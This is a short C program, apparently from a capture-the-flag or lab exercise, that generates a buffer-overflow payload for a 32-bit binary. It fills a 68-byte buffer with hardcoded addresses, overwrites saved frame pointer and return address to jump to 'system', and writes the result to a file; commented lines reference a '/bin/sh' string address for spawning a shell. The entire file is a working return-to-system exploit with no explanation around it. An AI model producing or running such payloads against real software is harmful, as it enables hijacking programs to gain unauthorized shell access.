#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main (int argc, char** argv){

    int size = 68;
    char buf[size];
    memset(buf, 'A', size);
    for (int i = 0; i < 65; i=i+4)
    {
    *(long *) &buf[i] = 0x080bb768; // ebp
    }
    
    *(long *) &buf[60] = 0xffffdcc8; // ebp
    *(long *) &buf[64] = 0x0804887f; // system

    FILE * el = fopen("el", "w");
    // *(long *) &buf[68] = 0xffffd100; // input address
    // *(long *) &buf[72] = 0x080bb768; // "/bin/sh"
    fwrite(buf, size, 1, el);
    fclose(el);

}